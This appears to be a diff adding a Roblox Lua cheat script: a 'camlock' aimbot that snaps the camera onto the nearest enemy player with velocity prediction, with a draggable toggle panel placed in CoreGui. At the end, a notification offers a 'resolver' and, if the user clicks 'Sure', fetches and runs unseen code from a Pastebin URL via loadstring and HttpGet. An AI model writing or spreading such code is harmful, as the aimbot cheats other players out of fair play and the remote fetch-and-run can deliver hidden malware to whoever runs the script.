@@ -1,0 +1,167 @@
+local Players      = game:GetService("Players")
+local RunService   = game:GetService("RunService")
+local StarterGui   = game:GetService("StarterGui")
+
+local LocalPlayer  = Players.LocalPlayer
+local Camera       = workspace.CurrentCamera
+local Mouse        = LocalPlayer:GetMouse()
+
+local TOGGLE_KEY   = "q"
+local SMOOTH       = 0.1768521
+local OFFSET_X     = 0.11107611
+local OFFSET_Y     = 0.11034856
+
+local isActive     = false
+local lockedTarget = nil
+
+local function FindNearestEnemy()
+    local screenCenter  = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+    local closestDist   = math.huge
+    local closestPart   = nil
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player == LocalPlayer then continue end
+
+        local char = player.Character
+        if not char then continue end
+
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+
+        if not hrp or not hum or hum.Health <= 0 then continue end
+
+        local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
+        if not onScreen then continue end
+
+        local dist = (screenCenter - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
+        if dist < closestDist then
+            closestDist = dist
+            closestPart = hrp
+        end
+    end
+
+    return closestPart
+end
+
+local screenGui                  = Instance.new("ScreenGui")
+screenGui.Name                   = "CamlockUI"
+screenGui.ResetOnSpawn           = false
+screenGui.ZIndexBehavior         = Enum.ZIndexBehavior.Sibling
+screenGui.Parent                 = game.CoreGui
+
+local panel                      = Instance.new("Frame")
+panel.Name                       = "Panel"
+panel.Parent                     = screenGui
+panel.BackgroundColor3           = Color3.fromRGB(10, 10, 10)
+panel.BorderSizePixel            = 0
+panel.Size                       = UDim2.new(0, 192, 0, 70)
+panel.AnchorPoint                = Vector2.new(0.5, 0.5)
+panel.Position                   = UDim2.new(0.5, 0, 0.5, 0)
+panel.Active                     = true
+panel.Draggable                  = true
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)
+
+local toggleBtn                  = Instance.new("TextButton")
+toggleBtn.Name                   = "ToggleBtn"
+toggleBtn.Parent                 = panel
+toggleBtn.BackgroundColor3       = Color3.fromRGB(30, 30, 30)
+toggleBtn.BackgroundTransparency = 0
+toggleBtn.BorderSizePixel        = 0
+toggleBtn.Position               = UDim2.new(0.0792, 0, 0.1857, 0)
+toggleBtn.Size                   = UDim2.new(0, 160, 0, 44)
+toggleBtn.Font                   = Enum.Font.SourceSansSemibold
+toggleBtn.Text                   = "Camlock: OFF"
+toggleBtn.TextColor3             = Color3.fromRGB(255, 255, 255)
+toggleBtn.TextScaled             = true
+toggleBtn.TextSize               = 18
+toggleBtn.TextWrapped            = true
+toggleBtn.AutoButtonColor        = false
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 6)
+
+local fovCircle                      = Instance.new("Frame")
+fovCircle.Name                       = "FOVCircle"
+fovCircle.Parent                     = screenGui
+fovCircle.BackgroundColor3           = Color3.fromRGB(255, 255, 255)
+fovCircle.BackgroundTransparency     = 0.7
+fovCircle.BorderSizePixel            = 0
+fovCircle.AnchorPoint                = Vector2.new(0.5, 0.5)
+fovCircle.Position                   = UDim2.new(0.5, 0, 0.45, 0)
+fovCircle.Size                       = UDim2.new(0, 50, 0, 50)
+fovCircle.Visible                    = false
+Instance.new("UICorner", fovCircle).CornerRadius = UDim.new(1, 0)
+
+local function enableCamlock()
+    lockedTarget = FindNearestEnemy()
+    if not lockedTarget then return end
+
+    isActive                 = true
+    fovCircle.Visible        = true
+    toggleBtn.Text           = "Camlock: ON"
+    toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 50)
+end
+
+local function disableCamlock()
+    isActive                 = false
+    lockedTarget             = nil
+    fovCircle.Visible        = false
+    toggleBtn.Text           = "Camlock: OFF"
+    toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+end
+
+local function toggleCamlock()
+    if isActive then
+        disableCamlock()
+    else
+        enableCamlock()
+    end
+end
+
+RunService.Heartbeat:Connect(function()
+    if not isActive then return end
+    if not lockedTarget or not lockedTarget.Parent then
+        disableCamlock()
+        return
+    end
+
+    local aimPos = lockedTarget.Position
+        + lockedTarget.Velocity * SMOOTH
+        + Vector3.new(OFFSET_X, OFFSET_Y, 0)
+
+    Camera.CFrame = CFrame.new(Camera.CFrame.p, aimPos)
+end)
+
+toggleBtn.MouseButton1Click:Connect(toggleCamlock)
+
+Mouse.KeyDown:Connect(function(pressedKey)
+    if pressedKey == TOGGLE_KEY then
+        toggleCamlock()
+    end
+end)
+
+LocalPlayer.CharacterAdded:Connect(function()
+    disableCamlock()
+end)
+
+StarterGui:SetCore("SendNotification", {
+    Title    = "Welcome!",
+    Text     = "Welcome, " .. LocalPlayer.DisplayName,
+    Icon     = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=180&h=180",
+    Duration = 5
+})
+
+local resolverCallback       = Instance.new("BindableFunction")
+resolverCallback.OnInvoke    = function(response)
+    if response == "Sure" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/0uym6u51"))()
+    end
+end
+
+StarterGui:SetCore("SendNotification", {
+    Title    = "Enable Resolver?",
+    Text     = "Load a resolver script for better camlock accuracy.",
+    Icon     = "",
+    Duration = 14,
+    Button1  = "Sure",
+    Button2  = "No",
+    Callback = resolverCallback
+})
